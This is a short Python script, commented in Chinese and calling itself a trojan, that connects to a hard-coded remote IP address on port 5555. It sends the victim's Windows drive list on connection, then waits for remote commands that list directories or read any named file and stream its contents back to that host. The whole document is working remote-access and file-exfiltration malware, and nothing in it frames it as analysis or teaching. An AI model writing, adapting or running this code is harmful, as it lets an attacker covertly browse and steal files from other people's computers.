import os
import pickle
from socket import*
from win32api import*

s = socket()                        # 创建套接字
s.connect(('146.56.223.48', 5555))  # 申请连接后台

# 木马上线之后第一件事情：盘符信息发给后台
disk_info = GetLogicalDriveStrings()
s.send(disk_info.encode())

while True:
    # 接收指令
    command_str = s.recv(1024).decode()
    print('收到指令:', command_str)
    command = command_str.split('|')

    if command[0] == 'dir':                  # 如果指令是dir
        dir_list = []                        # 创建列表
        for file in os.listdir(command[1]):  # 遍历当前目录
            isfile = os.path.isfile(command[1] + '\\' + file)     # 判断是不是文件  大小
            size = 0                         # 定义文件大小
            if isfile:                       # 如果是文件
                size = os.path.getsize(command[1] + '\\' + file)  # 计算大小
            dir_list.append([file, isfile, size])   # 列表保存了当前目录中每一个文件 名字 类型 大小
        s.send(pickle.dumps(dir_list))       # 把列表序列化 发送
    elif command[0] == 'get':
        # 读取command[1]文件的大小
        filesize = os.path.getsize(command[1])
        # 把大小发过去
        s.send(str(filesize).encode())
        # 等待回复
        s.recv(1024).decode()
        # 读取文件的数据
        with open(command[1], 'rb') as file:
            # 把文件数据发过去
            for data in file:
                s.send(data)
# 释放资源
s.close()